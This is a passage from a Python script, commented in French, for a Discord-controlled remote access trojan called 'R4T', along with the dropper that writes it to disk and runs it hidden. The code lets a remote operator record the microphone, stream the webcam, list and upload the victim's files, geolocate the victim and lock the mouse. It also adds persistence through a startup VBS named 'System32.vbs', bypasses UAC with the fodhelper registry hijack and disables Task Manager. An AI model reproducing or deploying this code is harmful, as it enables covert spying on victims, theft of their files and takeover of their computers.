        )
        await ctx.send(embed=embed)
        
        def block():
            while mouse_blocked:
                pyautogui.moveTo(0, 0)
                time.sleep(0.001)
        
        threading.Thread(target=block, daemon=True).start()
    else:
        embed = discord.Embed(
            title="Souris déjà bloquée",
            description="La souris est déjà bloquée.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

#unblock_mouse

@bot.command(name=f'{local_user_name}_unblock_mouse')
async def unblock_mouse(ctx):
    global mouse_blocked
    if mouse_blocked:
        mouse_blocked = False
        embed = discord.Embed(
            title="Souris débloquée",
            description="La souris est maintenant débloquée.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="Souris non bloquée",
            description="La souris n'est pas bloquée.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

#play_v

@bot.command(name=f'{local_user_name}_play_v')
async def play_v(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Veuillez joindre un fichier vidéo.")
        return

    attachment = ctx.message.attachments[0]
    filename = attachment.filename

    if not filename.endswith(('.mp4', '.mkv', '.avi', '.mov', '.flv')):
        await ctx.send("Le fichier joint n'est pas un format vidéo supporté.")
        return

    file_path = f"./{filename}"
    await attachment.save(file_path)

    vlc_path = "C:/Program Files/VideoLAN/VLC/vlc.exe" 

    try:
        subprocess.run([vlc_path, file_path], check=True) 
        await ctx.send(f"Lecture de la vidéo : {filename}")
    except subprocess.CalledProcessError as e:
        await ctx.send("Erreur lors de la tentative de lecture de la vidéo.")
        print(e)
    except FileNotFoundError:
        await ctx.send("Le lecteur vidéo spécifié est introuvable. Vérifiez le chemin.")

    os.remove(file_path)

#play_s

@bot.command(name=f'{local_user_name}_play_s')
async def play_s(ctx):
    if len(ctx.message.attachments) == 0:
        embed = discord.Embed(
            title="Aucun fichier joint",
            description="Veuillez joindre un fichier audio ou vidéo (MP3, MP4, WAV, etc.).",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
        return

    attachment = ctx.message.attachments[0]
    filename = attachment.filename

    if not filename.endswith(('.mp3', '.wav', '.mp4', '.mkv', '.avi', '.mov', '.flv')):
        embed = discord.Embed(
            title="Format non supporté",
            description="Le fichier joint n'est pas un format audio/vidéo supporté.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
        return

    file_path = f"./{filename}"
    await attachment.save(file_path)

    vlc_path = "C:/Program Files/VideoLAN/VLC/vlc.exe"

    try:
        subprocess.run([vlc_path, "--intf", "dummy", "--play-and-exit", "--no-video", file_path], check=True)

        embed = discord.Embed(
            title="Lecture audio",
            description=f"Lecture de l'audio de la vidéo : {filename}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
    except subprocess.CalledProcessError as e:
        embed = discord.Embed(
            title="Erreur de lecture",
            description="Erreur lors de la tentative de lecture de l'audio avec VLC.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
        print(e)
    except FileNotFoundError:
        embed = discord.Embed(
            title="Lecteur VLC introuvable",
            description="Le lecteur VLC spécifié est introuvable. Vérifiez le chemin.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

    os.remove(file_path)
    
#record

@bot.command(name=f'{local_user_name}_record')
async def record(ctx, time: int):
    if time <= 0:
        await ctx.send("Veuillez spécifier un temps d'enregistrement positif.")
        return

    file_path = "output.wav"
    chunk = 1024  
    format = pyaudio.paInt16  
    channels = 1  
    rate = 44100 

    p = pyaudio.PyAudio()

    try:
        stream = p.open(format=format,
                        channels=channels,
                        rate=rate,
                        input=True,
                        frames_per_buffer=chunk)
    except OSError as e:
        await ctx.send(f"Erreur lors de l'ouverture du flux audio : {e}")
        p.terminate()
        return

    await ctx.send(f"Enregistrement de {time} secondes...")

    frames = []

    for _ in range(0, int(rate / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(file_path, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(format))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()

    with open(file_path, 'rb') as f:
        await ctx.send("Voici l'enregistrement :", file=discord.File(f, file_path))

    os.remove(file_path)

@bot.command(name=f'{local_user_name}_startup')
async def startup(ctx):
    if sys.platform == "win32":
        try:
            file_name = "r4tbyHeartWay.pyw"
            
            appdata_roaming_path = Path(os.getenv('APPDATA')) / 'discord'
            file_path = appdata_roaming_path / file_name
            
            startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
            
            vbs_file_path = startup_folder / "System32.vbs"
            
            pythonw_path = Path(sys.executable).parent / "pythonw.exe"
            
            vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n'
            vbs_content += f'WshShell.Run chr(34) & "{pythonw_path}" & Chr(34) & " " & chr(34) & "{file_path}" & Chr(34), 0\n'
            vbs_content += 'Set WshShell = Nothing\n'
            
            with open(vbs_file_path, 'w') as vbs_file:
                vbs_file.write(vbs_content)
            
            await ctx.send("Le R4T a été ajouté au démarrage automatique du système.")
        except Exception as e:
            await ctx.send(f"Erreur lors de l'ajout au démarrage : {e}")
    else:
        await ctx.send("Cette commande fonctionne uniquement sur Windows.")

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

class disable_fsr:
    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self.disable(ctypes.byref(self.old_value))
    def __exit__(self, type, value, traceback):
        if self.success:
            self.revert(self.old_value)

async def bypass_uac(ctx, command):
    if isAdmin():
        os.system(command)
    else:
        await ctx.send("Tentative d'obtention des droits administratifs...")

        isexe = sys.argv[0].endswith("exe")
        current_dir = inspect.getframeinfo(inspect.currentframe()).filename
        cmd2 = current_dir if not isexe else sys.argv[0]

        create_reg_path = r"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force"""
        os.system(create_reg_path)

        create_trigger_reg_key = r"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force"""
        os.system(create_trigger_reg_key)

        if not isexe:
            create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python \"{cmd2}\"' -Force"""
        else:
            create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start \"{cmd2}\"' -Force"""
        os.system(create_payload_reg_key)

        with disable_fsr():
            os.system("fodhelper.exe")

        time.sleep(2)

        if isAdmin():
            await ctx.send("Élévation réussie, exécution de la commande...")
            os.system(command)
        else:
            await ctx.send("Échec de l'obtention des droits administratifs.")

        remove_reg = r"""powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force"""
        os.system(remove_reg)

@bot.command(name=f'{local_user_name}_uacbypass')
async def uacbypass(ctx):
    await bypass_uac(ctx, "echo 'Bypass réussi!'")

@bot.command(name=f'{local_user_name}_block_taskmanager')
async def block_taskmanager(ctx):
    block_cmd = r"""powershell New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force"""
    await bypass_uac(ctx, block_cmd)
    await ctx.send("Le gestionnaire des tâches a été désactivé.")

@bot.command(name=f'{local_user_name}_unblock_taskmanager')
async def unblock_taskmanager(ctx):
    unblock_cmd = r"""powershell Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Force"""
    await bypass_uac(ctx, unblock_cmd)
    await ctx.send("Le gestionnaire des tâches a été réactivé.")

def set_volume(volume_level):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = interface.QueryInterface(IAudioEndpointVolume)
    volume.SetMasterVolumeLevelScalar(volume_level, None)

#volumemax

@bot.command(name=f'{local_user_name}_volumemax')
async def volumemax(ctx):
    set_volume(1.0)
    embed = discord.Embed(
        title="Volume Maximum",
        description="🔊 Le volume a été mis au maximum.",
        color=EMBED_COLOR
    )
    await ctx.send(embed=embed)

#volumemin

@bot.command(name=f'{local_user_name}_volumemin')
async def volumemin(ctx):
    set_volume(0.0)
    embed = discord.Embed(
        title="Volume Minimum",
        description="🔈 Le volume a été mis au minimum.",
        color=EMBED_COLOR
    )
    await ctx.send(embed=embed)

@bot.command(name=f'{local_user_name}_list_folder')
async def list_folder(ctx):
    root_dir = 'C:\\'
    output_file = 'folder_list.txt'

    try:
        with open(output_file, 'w', encoding='utf-8') as file:
            file.write("Liste des dossiers disponibles :\n\n")
            # Récupérer tous les lecteurs disponibles
            available_drives = []
            for drive in range(ord('A'), ord('Z') + 1):
                drive_letter = chr(drive) + ":\\"
                try:
                    if os.path.exists(drive_letter):
                        available_drives.append(drive_letter)
                except:
                    pass
            
            file.write("Lecteurs disponibles : " + ", ".join(available_drives) + "\n\n")
            
            # Parcourir uniquement les dossiers du lecteur C:
            for root, dirs, _ in os.walk(root_dir):
                for dir_name in dirs:
                    file.write(os.path.join(root, dir_name) + '\n')
                # Limiter la profondeur pour éviter une exploration trop longue
                if root.count('\\') > 3:
                    dirs.clear()  # Ne pas explorer plus profondément

        await ctx.send(file=discord.File(output_file))
        os.remove(output_file)

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite lors du listage des dossiers : {e}")

@bot.command(name=f'{local_user_name}_list_file')
async def list_file(ctx, directory: str):
    output_file = 'file_list.txt'

    try:
        # Vérifier si le chemin existe et est accessible
        if not os.path.exists(directory):
            await ctx.send(f"⚠️ Le chemin spécifié n'existe pas : {directory}")
            return
            
        if not os.path.isdir(directory):
            await ctx.send(f"⚠️ Le chemin spécifié n'est pas un dossier : {directory}")
            return
            
        # Vérifier l'accessibilité du dossier
        try:
            os.listdir(directory)
        except PermissionError:
            await ctx.send(f"⚠️ Accès refusé au dossier : {directory}")
            return
        except Exception as access_error:
            await ctx.send(f"⚠️ Erreur lors de l'accès au dossier : {directory}\nErreur : {access_error}")
            return

        file_count = 0
        with open(output_file, 'w', encoding='utf-8') as file:
            file.write(f"Liste des fichiers dans {directory}:\n\n")
            
            for root, _, files in os.walk(directory):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    try:
                        # Obtenir des informations sur le fichier
                        file_size = os.path.getsize(file_path) / 1024  # Taille en KB
                        file.write(f"{file_path} ({file_size:.2f} KB)\n")
                        file_count += 1
                    except Exception as file_error:
                        file.write(f"{file_path} (Erreur d'accès: {str(file_error)})\n")
                
                # Limiter la profondeur pour éviter une exploration trop longue
                if root.count('\\') > 3:
                    break
                    
                # Limiter le nombre de fichiers pour éviter des fichiers trop volumineux
                if file_count > 500:
                    file.write("\n[Liste tronquée à 500 fichiers pour limiter la taille]\n")
                    break

        if file_count == 0:
            await ctx.send(f"Aucun fichier trouvé dans le dossier : {directory}")
            os.remove(output_file)
            return
            
        await ctx.send(file=discord.File(output_file))
        os.remove(output_file)

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite lors du listage des fichiers : {e}")

@bot.command(name=f'{local_user_name}_upload')
async def upload(ctx, file_path: str):
    try:
        # Vérifier si le fichier existe
        if not os.path.exists(file_path):
            await ctx.send(f"⚠️ Le fichier spécifié n'existe pas : {file_path}")
            return
            
        # Vérifier si c'est un fichier (et non un dossier)
        if not os.path.isfile(file_path):
            await ctx.send(f"⚠️ Le chemin spécifié n'est pas un fichier : {file_path}")
            return
            
        # Vérifier la taille du fichier
        file_size = os.path.getsize(file_path) / (1024 * 1024)  # Taille en MB
        if file_size > 8:
            await ctx.send(f"⚠️ Le fichier est trop volumineux ({file_size:.2f} MB). La limite est de 8 MB.")
            return
            
        # Vérifier l'accessibilité du fichier
        try:
            with open(file_path, 'rb') as _:
                pass
        except PermissionError:
            await ctx.send(f"⚠️ Accès refusé au fichier : {file_path}")
            return
        except Exception as access_error:
            await ctx.send(f"⚠️ Erreur lors de l'accès au fichier : {file_path}\nErreur : {access_error}")
            return

        # Envoi du fichier
        message = await ctx.send(f"📤 Envoi du fichier en cours : `{file_path}` ({file_size:.2f} MB)...")
        await ctx.send(file=discord.File(file_path))
        await message.edit(content=f"✅ Fichier envoyé avec succès : `{file_path}`")

    except Exception as e:
        await ctx.send(f"❌ Une erreur s'est produite lors de l'envoi du fichier : {e}")

@bot.command(name=f'{local_user_name}_wallpaper')
async def wallpaper(ctx):
    if not ctx.message.attachments:
        await ctx.send("Veuillez joindre une image pour définir comme fond d'écran.")
        return
    
    attachment = ctx.message.attachments[0]
    file_path = os.path.join(os.getcwd(), attachment.filename)
    
    try:
        await attachment.save(file_path)

        ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 0)

        embed = discord.Embed(
            title="Fond d'écran mis à jour",
            description="L'image a été définie comme fond d'écran avec succès.",
            color=EMBED_COLOR
        )
        embed.set_image(url=attachment.url)

        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")
    
    finally:
        if os.path.isfile(file_path):
            os.remove(file_path)

@bot.command(name=f'{local_user_name}_logout')
async def logout(ctx):
    try:
        os_type = platform.system()

        if os_type == "Windows":
            os.system("shutdown /l")
        elif os_type == "Linux" or os_type == "Darwin":
            os.system("gnome-session-quit --logout --no-prompt")
        else:
            embed = discord.Embed(
                title="Erreur",
                description=f"Système d'exploitation non supporté : {os_type}",
                color=EMBED_COLOR
            )
            await ctx.send(embed=embed)
            return

        embed = discord.Embed(
            title="Déconnexion",
            description="Déconnexion en cours...",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="Erreur",
            description=f"Une erreur s'est produite : {e}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

#geolocate

bot.remove_command('geolocate')

@bot.command(name=f'{local_user_name}_geolocate')
async def geolocate(ctx):
    try:
        response = requests.get("https://ipinfo.io")
        data = response.json()

        location = data.get("loc", None)
        city = data.get("city", "Inconnue")
        region = data.get("region", "Inconnue")
        country = data.get("country", "Inconnu")
        postal = data.get("postal", "Inconnu")
        ip = data.get("ip", "Inconnu")
        org = data.get("org", "Inconnue")

        if location:
            latitude, longitude = location.split(',')
            embed = discord.Embed(
                title="Localisation Actuelle",
                description="📍 Voici les informations de géolocalisation obtenues :",
                color=EMBED_COLOR
            )
            embed.add_field(name="IP", value=ip, inline=True)
            embed.add_field(name="Organisation", value=org, inline=True)
            embed.add_field(name="Ville", value=city, inline=True)
            embed.add_field(name="Région", value=region, inline=True)
            embed.add_field(name="Pays", value=country, inline=True)
            embed.add_field(name="Code Postal", value=postal, inline=True)
            embed.add_field(name="Latitude", value=latitude, inline=True)
            embed.add_field(name="Longitude", value=longitude, inline=True)
            embed.add_field(name="Carte", value=f"https://www.google.com/maps?q={latitude},{longitude}", inline=False)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="Erreur",
                description="Impossible de déterminer la localisation.",
                color=EMBED_COLOR
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="Erreur",
            description=f"Une erreur s'est produite : {e}",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)

#webcam_on

@bot.command(name=f'{local_user_name}_webcam_on')
async def webcam_on(ctx):
    global webcam_task, webcam_channel

    guild = ctx.guild
    webcam_channel = discord.utils.get(guild.text_channels, name="webcam")
    
    if webcam_channel is None:
        webcam_channel = await guild.create_text_channel("webcam")
        embed = discord.Embed(
            title="Webcam",
            description="📹 Salon webcam créé.",
            color=EMBED_COLOR
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="Webcam",
            description="Le salon webcam existe déjà.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)

    if webcam_task is None:
        webcam_task = bot.loop.create_task(capture_webcam(ctx))

@bot.command(name=f'{local_user_name}_webcam_off')
async def webcam_off(ctx):
    global webcam_task, webcam_channel, captured_messages

    if webcam_task is not None:
        webcam_task.cancel()
        webcam_task = None
        embed = discord.Embed(
            title="Webcam",
            description="📷 Webcam désactivée.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

    if captured_messages:
        for msg in captured_messages:
            await msg.delete()
        captured_messages = []

    if webcam_channel is not None:
        await webcam_channel.delete()
        webcam_channel = None

async def capture_webcam(ctx):
    global webcam_channel, captured_messages

    cap = cv2.VideoCapture(0)

    try:
        while True:
            ret, frame = cap.read()

            if not ret:
                embed = discord.Embed(
                    title="Erreur Webcam",
                    description="Erreur : Impossible de capturer l'image depuis la webcam.",
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed)
                break

            cv2.imwrite(CAPTURE_PATH, frame)

            with open(CAPTURE_PATH, 'rb') as f:
                message = await webcam_channel.send(file=discord.File(f, "webcam_capture.jpg"))

            captured_messages.append(message)

            if len(captured_messages) > 1:
                old_msg = captured_messages.pop(0)
                await old_msg.delete()

            await asyncio.sleep(0.1)

    except asyncio.CancelledError:
        pass
    finally:
        cap.release()
        if os.path.exists(CAPTURE_PATH):
            os.remove(CAPTURE_PATH)

#spam

programs_list = [
    {"label": "Notepad", "value": "notepad.exe"},
    {"label": "Calculator", "value": "calc.exe"},
    {"label": "Paint", "value": "mspaint.exe"},
    {"label": "cmd", "value": "cmd.exe"}
]

execution_options = [
    {"label": "1", "value": "1"},
    {"label": "5", "value": "5"},
    {"label": "10", "value": "10"},
    {"label": "50", "value": "50"},
    {"label": "100", "value": "100"}
]

class SpamProgramView(View):
    def __init__(self):
        super().__init__()
        self.program_select = Select(
            placeholder="Choisissez un programme...",
            options=[discord.SelectOption(label=prog["label"], value=prog["value"]) for prog in programs_list]
        )
        self.add_item(self.program_select)

        self.selected_program = None

        self.program_select.callback = self.program_callback

    async def program_callback(self, interaction: discord.Interaction):
        self.selected_program = self.program_select.values[0]

        await interaction.message.delete()

        await interaction.message.channel.send(embed=create_execution_embed(), view=SpamExecutionView(self.selected_program))

class SpamExecutionView(View):
    def __init__(self, selected_program):
        super().__init__()
        self.selected_program = selected_program
        self.execution_select = Select(
            placeholder="Choisissez le nombre d'exécutions...",
            options=[discord.SelectOption(label=option["label"], value=option["value"]) for option in execution_options]
        )
        self.add_item(self.execution_select)

        self.selected_execution_count = 1

        self.execution_select.callback = self.execution_callback

    async def execution_callback(self, interaction: discord.Interaction):
        self.selected_execution_count = int(self.execution_select.values[0])

        await interaction.message.delete()

        await self.execute_program(interaction)

    async def execute_program(self, interaction: discord.Interaction):
        try:
            for _ in range(self.selected_execution_count):
                subprocess.Popen(self.selected_program)
                await asyncio.sleep(1)

            embed = discord.Embed(
                title="Exécution terminée",
                description=f"Le programme **{self.selected_program}** a été exécuté **{self.selected_execution_count}** fois.",
                color=EMBED_COLOR,
            )
            await interaction.message.channel.send(embed=embed)

        except Exception as e:
            embed = discord.Embed(
                title="Erreur",
                description=f"Une erreur est survenue lors de l'exécution du programme : {str(e)}",
                color=discord.Color.red(),
            )
            await interaction.message.channel.send(embed=embed)

def create_program_embed():
    embed = discord.Embed(
        title="Sélectionnez un programme",
        description="Veuillez choisir le programme à exécuter.",
        color=EMBED_COLOR,
    )
    return embed

def create_execution_embed():
    embed = discord.Embed(
        title="Sélectionnez le nombre d'exécutions",
        description="Choisissez combien de fois vous souhaitez exécuter le programme.",
        color=EMBED_COLOR,
    )
    return embed

@bot.command(name=f'{local_user_name}_spam')
async def spam_command(ctx):
    await ctx.send(embed=create_program_embed(), view=SpamProgramView())

#end

async def main():
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
'''

try:
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(script_content)
    print(f"Le fichier {file_name} a été créé avec succès dans {discord_path}.")

    subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe'), str(file_path)], close_fds=True)
    print(f"Le script {file_name} a été lancé en arrière-plan.")
    
except Exception as e:
    print(f"Une erreur s'est produite : {e}")